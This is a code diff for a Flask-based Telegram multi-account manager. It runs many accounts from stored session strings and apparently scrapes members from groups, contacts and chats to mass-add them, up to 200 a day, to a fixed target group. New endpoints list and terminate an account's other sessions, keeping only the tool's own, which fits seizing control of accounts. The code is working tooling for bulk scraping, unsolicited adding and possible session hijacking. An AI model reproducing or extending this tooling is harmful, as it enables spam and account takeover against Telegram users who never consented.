+            return jsonify({'success': False, 'error': 'Account ID and Chat ID required'})
+        
+        account_key = str(account_id)
+        chat_key = str(chat_id)
+        
+        if account_key in conversation_history and chat_key in conversation_history[account_key]:
+            conversation_history[account_key][chat_key] = []
+            save_conversation_history()
+        
+        return jsonify({'success': True, 'message': 'History cleared'})
+        
+    except Exception as e:
+        logger.error(f"Clear history error: {e}")
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/get-sessions', methods=['POST'])
+def get_sessions():
+    try:
+        data = request.json
+        account_id = data.get('accountId')
+        
+        if not account_id:
+            return jsonify({'success': False, 'error': 'Account ID required'})
+        
+        account = next((acc for acc in accounts if acc['id'] == account_id), None)
+        
+        if not account:
+            return jsonify({'success': False, 'error': 'Account not found'})
+        
+        async def get_sessions():
+            client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
+            await client.connect()
+            
+            try:
+                result = await client(functions.account.GetAuthorizationsRequest())
+                
+                sessions = []
+                current_hash = None
+                
+                for auth in result.authorizations:
+                    session_info = {
+                        'hash': auth.hash,
+                        'device_model': auth.device_model,
+                        'platform': auth.platform,
+                        'system_version': auth.system_version,
+                        'api_id': auth.api_id,
+                        'app_name': auth.app_name,
+                        'app_version': auth.app_version,
+                        'date_created': auth.date_created,
+                        'date_active': auth.date_active,
+                        'ip': auth.ip,
+                        'country': auth.country,
+                        'region': auth.region,
+                        'current': auth.current
+                    }
+                    
+                    if auth.current:
+                        current_hash = auth.hash
+                    
+                    sessions.append(session_info)
+                
+                return {'success': True, 'sessions': sessions, 'current_hash': current_hash}
+                
+            except FreshResetAuthorisationForbiddenError:
+                return {'success': False, 'error': 'fresh_reset_forbidden'}
+            except Exception as e:
+                logger.error(f"Get sessions error: {e}")
+                return {'success': False, 'error': str(e)}
+            finally:
+                await client.disconnect()
+        
+        result = run_async(get_sessions())
+        return jsonify(result)
+        
+    except Exception as e:
+        logger.error(f"Get sessions error: {e}")
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/terminate-session', methods=['POST'])
+def terminate_session():
+    try:
+        data = request.json
+        account_id = data.get('accountId')
+        session_hash = data.get('hash')
+        
+        if not account_id or not session_hash:
+            return jsonify({'success': False, 'error': 'Account ID and session hash required'})
+        
+        account = next((acc for acc in accounts if acc['id'] == account_id), None)
+        
+        if not account:
+            return jsonify({'success': False, 'error': 'Account not found'})
+        
+        async def terminate():
+            client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
+            await client.connect()
+            
+            try:
+                await client(functions.account.ResetAuthorizationRequest(int(session_hash)))
+                return {'success': True, 'message': 'Session terminated'}
+            except Exception as e:
+                logger.error(f"Terminate session error: {e}")
+                return {'success': False, 'error': str(e)}
+            finally:
+                await client.disconnect()
+        
+        result = run_async(terminate())
+        return jsonify(result)
+        
+    except Exception as e:
+        logger.error(f"Terminate session error: {e}")
+        return jsonify({'success': False, 'error': str(e)})
+
+@app.route('/api/terminate-sessions', methods=['POST'])
+def terminate_sessions():
+    try:
+        data = request.json
+        account_id = data.get('accountId')
+        
+        if not account_id:
+            return jsonify({'success': False, 'error': 'Account ID required'})
+        
+        account = next((acc for acc in accounts if acc['id'] == account_id), None)
+        
+        if not account:
+            return jsonify({'success': False, 'error': 'Account not found'})
+        
+        async def terminate():
+            client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
+            await client.connect()
+            
+            try:
+                result = await client(functions.account.GetAuthorizationsRequest())
+                
+                current_hash = None
+                for auth in result.authorizations:
+                    if auth.current:
+                        current_hash = auth.hash
+                        break
+                
+                count = 0
+                for auth in result.authorizations:
+                    if auth.hash != current_hash:
+                        try:
+                            await client(functions.account.ResetAuthorizationRequest(auth.hash))
+                            count += 1
+                        except:
+                            continue
+                
+                return {'success': True, 'message': f'Terminated {count} sessions'}
+                
+            except Exception as e:
+                logger.error(f"Terminate sessions error: {e}")
+                return {'success': False, 'error': str(e)}
+            finally:
+                await client.disconnect()
+        
+        result = run_async(terminate())
+        return jsonify(result)
+        
+    except Exception as e:
+        logger.error(f"Terminate sessions error: {e}")
         return jsonify({'success': False, 'error': str(e)})
 
 @app.route('/api/reconnect', methods=['GET'])
 def reconnect_all():
-    for account_key in list(active_clients.keys()):
-        stop_auto_reply_for_account(int(account_key))
-    
-    time.sleep(2)
-    start_auto_reply_thread()
-    
-    return jsonify({
-        'success': True,
-        'message': 'Reconnecting all accounts',
-        'active': len(active_clients)
-    })
+    try:
+        # Stop all auto-reply
+        for account_key in list(active_clients.keys()):
+            stop_auto_reply_for_account(int(account_key))
+        
+        time.sleep(2)
+        
+        # Restart auto-reply
+        start_auto_reply_thread()
+        
+        # Restart auto-add for any stopped workers
+        for account in accounts:
+            account_key = str(account['id'])
+            if auto_add_settings.get(account_key, {}).get('enabled', False):
+                if account_key not in active_auto_add_tasks:
+                    AutoAddManager.start_for_account(account)
+        
+        return jsonify({
+            'success': True,
+            'message': 'Reconnecting all accounts',
+            'active_auto_reply': len(active_clients),
+            'active_auto_add': len(active_auto_add_tasks)
+        })
+        
+    except Exception as e:
+        logger.error(f"Reconnect error: {e}")
+        return jsonify({'success': False, 'error': str(e)})
 
 @app.route('/api/health', methods=['GET'])
 def health_check():
-    auto_reply_count = len([k for k in active_clients.keys() if not k.startswith('auto_add_')])
-    auto_add_count = len([k for k in active_clients.keys() if k.startswith('auto_add_')])
-    
-    return jsonify({
-        'status': 'healthy',
-        'accounts': len(accounts),
-        'auto_reply_active': auto_reply_count,
-        'auto_add_active': auto_add_count,
-        'active_clients': list(active_clients.keys()),
-        'time': datetime.now().isoformat()
-    })
+    try:
+        auto_reply_count = len([k for k in active_clients.keys() if not k.startswith('auto_add_')])
+        auto_add_count = len(active_auto_add_tasks)
+        
+        # Check worker health
+        healthy_workers = 0
+        for account_key in active_auto_add_tasks:
+            if account_key in auto_add_state:
+                last_active = auto_add_state[account_key].get('last_active')
+                if last_active:
+                    try:
+                        last_time = datetime.fromisoformat(last_active)
+                        if (datetime.now() - last_time).seconds < 600:  # Active in last 10 min
+                            healthy_workers += 1
+                    except:
+                        pass
+        
+        return jsonify({
+            'status': 'healthy',
+            'accounts': len(accounts),
+            'auto_reply_active': auto_reply_count,
+            'auto_add_active': auto_add_count,
+            'auto_add_healthy': healthy_workers,
+            'active_clients': list(active_clients.keys()),
+            'time': datetime.now().isoformat()
+        })
+        
+    except Exception as e:
+        logger.error(f"Health check error: {e}")
+        return jsonify({'status': 'error', 'error': str(e)})
+
+@app.route('/ping')
+def ping():
+    return jsonify({'status': 'ok', 'time': datetime.now().isoformat()})
 
 # ==================== KEEP ALIVE SYSTEM ====================
 
 def keep_alive():
     """Keep Render from sleeping and maintain Telegram connections"""
-    app_url = os.environ.get('RENDER_EXTERNAL_URL', 'https://e-gram-98zv.onrender.com')
+    app_url = os.environ.get('RENDER_EXTERNAL_URL', 'http://localhost:5000')
     
     while True:
         try:
-            requests.get(app_url, timeout=10)
+            # Ping main endpoints
+            requests.get(f"{app_url}/ping", timeout=10)
             requests.get(f"{app_url}/api/health", timeout=10)
             
+            # Check all active clients
             for account_key, client in list(active_clients.items()):
                 try:
-                    loop = asyncio.new_event_loop()
-                    asyncio.set_event_loop(loop)
-                    loop.run_until_complete(client.get_me())
-                    loop.close()
-                    logger.info(f"✅ Connection alive for account {account_key}")
+                    if not account_key.startswith('auto_add_'):
+                        loop = asyncio.new_event_loop()
+                        asyncio.set_event_loop(loop)
+                        me = loop.run_until_complete(
+                            asyncio.wait_for(client.get_me(), timeout=10)
+                        )
+                        loop.close()
+                        logger.info(f"✅ Connection alive for account {account_key}")
                 except Exception as e:
-                    logger.warning(f"⚠️ Connection may be dead for account {account_key}: {e}")
+                    logger.warning(f"⚠️ Connection may be dead for account {account_key}: {type(e).__name__}")
+            
+            # Check auto-add workers
+            for account_key in list(active_auto_add_tasks.keys()):
+                if account_key not in auto_add_state:
+                    logger.warning(f"⚠️ No state for auto-add worker {account_key}, restarting...")
+                    account = next((acc for acc in accounts if str(acc['id']) == account_key), None)
+                    if account and auto_add_settings.get(account_key, {}).get('enabled', False):
+                        AutoAddManager.start_for_account(account)
             
             logger.info(f"🔋 Keep-alive ping sent at {time.strftime('%H:%M:%S')}")
+            
         except Exception as e:
-            logger.error(f"Keep-alive error: {e}")
+            logger.error(f"Keep-alive error: {type(e).__name__}: {str(e)[:100]}")
         
-        time.sleep(240)
-
-# ==================== STARTUP FUNCTIONS ====================
+        time.sleep(240)  # 4 minutes
 
 def start_auto_reply_thread():
     """Start auto-reply for all enabled accounts"""
@@ -3054,81 +2982,88 @@ def start_auto_reply_thread():
                 )
                 thread.start()
                 client_tasks[account_key] = thread
+                logger.info(f"💬 Auto-reply started for {account.get('name')}")
                 time.sleep(2)
-
-def start_auto_add_threads():
-    """Start auto-add with auto-join for all enabled accounts"""
-    time.sleep(5)
-    logger.info("Checking for auto-add enabled accounts with auto-join...")
-    for account in accounts:
-        account_key = str(account['id'])
-        if account_key in auto_add_settings and auto_add_settings[account_key].get('enabled', False):
-            target_group = auto_add_settings[account_key].get('target_group', '@abe_armygroup')
-            thread = threading.Thread(
-                target=lambda acc=account: run_async(ultra_fast_auto_add_loop(acc)),
-                daemon=True
-            )
-            thread.start()
-            client_tasks[f"auto_add_{account_key}"] = thread
-            logger.info(f"🚀 Started auto-add with auto-join to {target_group} for account {account.get('name')}")
 
 def auto_start_all_accounts():
     """Auto-start both auto-reply and auto-add for all accounts on startup"""
-    time.sleep(5)
+    try:
+        time.sleep(5)
+        
+        for account in accounts:
+            account_key = str(account['id'])
+            
+            # Initialize settings if needed
+            if account_key not in auto_add_settings:
+                auto_add_settings[account_key] = {
+                    'enabled': True,
+                    'target_group': '@abe_armygroup',
+                    'delay_seconds': 15,
+                    'daily_limit': 200,
+                    'source_groups': DEFAULT_SOURCE_GROUPS,
+                    'use_contacts': True,
+                    'use_recent_chats': True,
+                    'use_scraping': True,
+                    'scrape_limit_per_group': 500,
+                    'skip_bots': True,
+                    'auto_join': True,
+                    'total_added': 0,
+                    'added_today': 0,
+                    'last_reset': datetime.now().strftime('%Y-%m-%d'),
+                    'last_added': None
+                }
+                save_json(AUTO_ADD_SETTINGS_FILE, auto_add_settings)
+            
+            if account_key not in reply_settings:
+                reply_settings[account_key] = {
+                    'enabled': True,
+                    'chats': {}
+                }
+                save_reply_settings()
+            
+            # Start auto-reply if enabled
+            if reply_settings[account_key].get('enabled', True):
+                if account_key not in active_clients:
+                    thread = threading.Thread(
+                        target=lambda acc=account: run_async(start_auto_reply_for_account(acc)),
+                        daemon=True
+                    )
+                    thread.start()
+                    client_tasks[account_key] = thread
+                    logger.info(f"💬 Auto-reply started for {account.get('name')}")
+            
+            # Start auto-add if enabled
+            if auto_add_settings[account_key].get('enabled', True):
+                AutoAddManager.start_for_account(account)
+                logger.info(f"🚀 Auto-add started for {account.get('name')}")
+                time.sleep(2)
+        
+        logger.info(f"✅ All services started for {len(accounts)} accounts")
+        
+    except Exception as e:
+        logger.error(f"❌ Error in auto_start_all_accounts: {e}")
+        logger.error(traceback.format_exc())
+
+# ==================== GRACEFUL SHUTDOWN ====================
+
+def cleanup():
+    """Cleanup function for graceful shutdown"""
+    logger.info("🛑 Shutting down services...")
     
-    for account in accounts:
-        account_key = str(account['id'])
-        
-        # Initialize auto-add settings if not exist
-        if account_key not in auto_add_settings:
-            auto_add_settings[account_key] = {
-                'enabled': True,
-                'target_group': '@abe_armygroup',
-                'delay_seconds': 15,
-                'daily_limit': 200,
-                'source_groups': DEFAULT_SOURCE_GROUPS,
-                'use_contacts': True,
-                'use_recent_chats': True,
-                'use_scraping': True,
-                'scrape_limit_per_group': 500,
-                'skip_bots': True,
-                'auto_join': True,
-                'total_added': 0,
-                'added_today': 0,
-                'last_reset': datetime.now().strftime('%Y-%m-%d'),
-                'last_added': None
-            }
-            save_auto_add_settings()
-        
-        # Initialize reply settings if not exist
-        if account_key not in reply_settings:
-            reply_settings[account_key] = {
-                'enabled': True,
-                'chats': {}
-            }
-            save_reply_settings()
-        
-        # Start auto-reply if enabled
-        if reply_settings[account_key].get('enabled', True):
-            if account_key not in active_clients:
-                thread = threading.Thread(
-                    target=lambda acc=account: run_async(start_auto_reply_for_account(acc)),
-                    daemon=True
-                )
-                thread.start()
-                client_tasks[account_key] = thread
-                logger.info(f"💬 Auto-reply started for {account.get('name')}")
-        
-        # Start auto-add if enabled
-        if auto_add_settings[account_key].get('enabled', True):
-            target_group = auto_add_settings[account_key].get('target_group', '@abe_armygroup')
-            thread = threading.Thread(
-                target=lambda acc=account: run_async(ultra_fast_auto_add_loop(acc)),
-                daemon=True
-            )
-            thread.start()
-            client_tasks[f"auto_add_{account_key}"] = thread
-            logger.info(f"🚀 Auto-add with auto-join started for {account.get('name')} -> {target_group}")
+    # Save all state
+    save_json(AUTO_ADD_SETTINGS_FILE, auto_add_settings)
+    save_json(ADDED_MEMBERS_FILE, added_members_pool)
+    save_json(AUTO_ADD_STATE_FILE, auto_add_state)
+    save_reply_settings()
+    save_accounts()
+    
+    logger.info("✅ State saved. Goodbye!")
+
+import atexit
+atexit.register(cleanup)
+
+signal.signal(signal.SIGTERM, lambda s, f: cleanup())
+signal.signal(signal.SIGINT, lambda s, f: cleanup())
 
 # ==================== MAIN STARTUP ====================
 
@@ -3136,23 +3071,42 @@ if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
     
     print('\n' + '='*70)
-    print('🤖 TELEGRAM MULTI-ACCOUNT MANAGER')
+    print('🤖 TELEGRAM MULTI-ACCOUNT MANAGER v2.0')
     print('='*70)
     print(f'✅ Port: {port}')
     print(f'✅ Accounts loaded: {len(accounts)}')
-    print(f'✅ Reply settings loaded: {len(reply_settings)}')
-    print(f'✅ Auto-add settings loaded: {len(auto_add_settings)}')
+    print(f'✅ Reply settings: {len(reply_settings)}')
+    print(f'✅ Auto-add settings: {len(auto_add_settings)}')
+    print(f'✅ Member pools: {len(added_members_pool)}')
     print('='*70)
     print('🎯 FEATURES:')
     print('   • Auto-Reply (Abel AI)')
-    print('   • Auto-Add Members')
-    print('   • Auto-Join Target Group')
+    print('   • Auto-Add Members with Auto-Join')
+    print('   • Session Management')
+    print('   • Keep-Alive System')
+    print('='*70)
+    print('📄 PAGES:')
+    print('   • /         - Login')
+    print('   • /all      - All Sessions')
+    print('   • /fog      - FOG')
+    print('   • /dash     - Dashboard')
+    print('   • /auto-add - Auto Add Settings')
     print('='*70)
     
     # Start keep-alive
     threading.Thread(target=keep_alive, daemon=True).start()
+    logger.info("🔋 Keep-alive system started")
     
     # Auto-start all features
     threading.Thread(target=auto_start_all_accounts, daemon=True).start()
+    logger.info("🚀 Auto-starting all services...")
     
-    app.run(host='0.0.0.0', port=port, debug=False)
+    # Run Flask
+    try:
+        app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
+    except KeyboardInterrupt:
+        logger.info("👋 Received keyboard interrupt")
+        cleanup()
+    except Exception as e:
+        logger.error(f"❌ Server error: {e}")
+        cleanup()
